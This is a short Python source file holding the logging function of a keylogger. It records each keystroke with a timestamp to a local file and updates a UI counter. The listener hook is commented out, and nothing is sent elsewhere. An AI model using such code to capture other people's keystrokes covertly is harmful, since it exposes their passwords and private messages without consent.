from datetime import datetime

key_count = 0

def write_to_file(key, update_ui_callback):

    global key_count
    key_count += 1
    

    letter = str(key)

    letter = letter.replace("'", "")

   

    if(letter == "Key.enter"):
        letter = " [ Enter] " 
    
    if(letter == "Key.space"):
        letter = " "

    if(letter == "Key.backspace"):
        letter = " [Backspace] "
    
    if(letter == "Key.shift"):
        letter = " [Shift] "

    if(letter == "Key.ctrl_l"):
        letter = "  [CTRL_l] "

    if(letter == "Key.ctrl_r"):
        letter = " [CTRL_r] "

    if(letter == "Key.alt_l"):
        letter = " [alt_l] "

    if(letter == "Key.alt_r"):
        letter = " [alt_r] "

    if(letter == "Key.tab"):
        letter = " [Tab] "

    if (letter == "Key.caps_lock"):
        letter = " [capslock] "
    
    time_now = datetime.now().strftime("%H:%M:%S")

   
    with open("log.txt", "a") as f:
        f.write(f"\n[{time_now}] {letter}\n")
    

    print(update_ui_callback)
    print(type(update_ui_callback))
    update_ui_callback(key_count)

# with Listener(on_press = write_to_file) as l:
#     l.join()

